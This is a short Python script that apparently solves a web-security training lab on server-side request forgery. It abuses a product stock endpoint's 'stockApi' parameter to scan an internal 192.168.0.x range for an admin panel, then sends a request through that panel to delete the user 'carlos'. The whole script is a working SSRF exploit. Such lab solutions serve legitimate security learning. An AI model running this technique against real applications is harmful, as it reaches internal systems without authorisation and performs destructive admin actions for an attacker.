import requests as r
from time import sleep


# Lab: Basic SSRF against another back-end system

link = "https://0a0f00fe04d237f0c0531f8a00800094.web-security-academy.net/product/stock"  # endpoint /product/stock


def brute_force_addr(l):
   
    endpoint=""
    for i in range(255):
        endpoint = "http://192.168.0.{}:8080/admin".format(str(i))
        print("[+] testing",endpoint)
        my_req= r.post(l,data={"stockApi":endpoint })   
        response = my_req.text 
        if "admin" in response.lower():
            print("IP: 192.168.0.",i )
            my_req.close()
            return endpoint
        
        my_req.close()
        sleep(0.4)




def access_admin_panel(admin_panel):
    snd_req = r.post(link,data={"stockApi":admin_panel+"/delete?username=carlos" })   
    snd_response = snd_req.text
    print(snd_response)
    snd_req.close()


if __name__ == '__main__':
    admin_endpoint_ip  = brute_force_addr(link)
    access_admin_panel(admin_endpoint_ip)